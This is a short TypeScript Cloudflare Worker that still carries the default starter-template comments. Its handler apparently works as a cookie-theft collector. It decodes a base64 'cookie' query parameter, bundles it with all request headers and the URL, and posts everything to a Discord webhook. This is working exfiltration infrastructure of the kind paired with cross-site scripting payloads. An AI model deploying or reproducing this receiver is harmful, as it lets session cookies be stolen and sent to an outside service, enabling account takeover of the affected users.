/**
 * Welcome to Cloudflare Workers! This is your first worker.
 *
 * - Run `wrangler dev src/index.ts` in your terminal to start a development server
 * - Open a browser tab at http://localhost:8787/ to see your worker in action
 * - Run `wrangler deploy src/index.ts --name my-worker` to deploy your worker
 *
 * Learn more at https://developers.cloudflare.com/workers/
 */

export interface Env {
  // Example binding to KV. Learn more at https://developers.cloudflare.com/workers/runtime-apis/kv/
  // MY_KV_NAMESPACE: KVNamespace;
  //
  // Example binding to Durable Object. Learn more at https://developers.cloudflare.com/workers/runtime-apis/durable-objects/
  // MY_DURABLE_OBJECT: DurableObjectNamespace;
  //
  // Example binding to R2. Learn more at https://developers.cloudflare.com/workers/runtime-apis/r2/
  // MY_BUCKET: R2Bucket;
  //
  // Example binding to a Service. Learn more at https://developers.cloudflare.com/workers/runtime-apis/service-bindings/
  // MY_SERVICE: Fetcher;
  // ANALYTICS: AnalyticsEngineDataset;
  DISCORD_WEBHOOK: string;
}

export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
    const headers = Object.fromEntries(request.headers.entries());
    const url = new URL(request.url);
    const cookies = atob(url.searchParams.get("cookie") ?? "");
    const json = JSON.stringify(
      {
        headers,
        url: request.url,
        cookies,
      },
      null,
      4
    );
    const content = `\`\`\`json\n${json}\n\`\`\``;
    const body = JSON.stringify({ content });
    await fetch(env.DISCORD_WEBHOOK, {
      method: "POST",
      body,
      headers: {
        "content-type": "application/json;charset=UTF-8",
      },
    });
    return new Response(null, { status: 200 });
  },
};
